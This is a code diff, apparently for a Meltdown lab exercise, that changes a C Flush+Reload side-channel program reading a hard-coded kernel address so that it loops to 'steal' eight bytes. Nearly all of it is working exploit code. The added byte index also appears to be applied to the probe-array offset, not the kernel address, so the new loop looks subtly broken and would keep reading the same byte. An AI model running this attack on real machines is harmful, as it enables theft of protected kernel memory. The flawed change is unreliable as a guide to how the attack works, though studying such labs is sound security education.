@@ -44,7 +44,7 @@ void reloadSideChannelImproved()
 }
 /*********************** Flush + Reload ************************/
 
-void meltdown_asm(unsigned long kernel_data_addr)
+void meltdown_asm(unsigned long kernel_data_addr, int byte_index_to_steal)
 {
    char kernel_data = 0;
    
@@ -61,7 +61,7 @@ void meltdown_asm(unsigned long kernel_data_addr)
     
    // The following statement will cause an exception
    kernel_data = *(char*)kernel_data_addr;  
-   array[kernel_data * 4096 + DELTA] += 1;              
+   array[kernel_data * 4096 + DELTA + byte_index_to_steal] += 1;              
 }
 
 // signal handler
@@ -71,7 +71,7 @@ static void catch_segv()
    siglongjmp(jbuf, 1);
 }
 
-int main()
+int attempt_to_steal_byte(int byte_index_to_steal)
 {
   int i, j, ret = 0;
   
@@ -100,7 +100,7 @@ int main()
 	for (j = 0; j < 256; j++) 
 		_mm_clflush(&array[j * 4096 + DELTA]);
 
-	if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0x49f9dadb); }
+	if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0x49f9dadb, byte_index_to_steal); }
 
 	reloadSideChannelImproved();
   }
@@ -113,6 +113,16 @@ int main()
 
   printf("The secret value is %d %c\n", max, max);
   printf("The number of hits is %d\n", scores[max]);
+
+  return max;
+}
+
+int main()
+{
+  int num_bytes_to_steal = 8;
+
+  for (int i = 0;i < num_bytes_to_steal; i++)
+    attempt_to_steal_byte(i);
 
   return 0;
 }
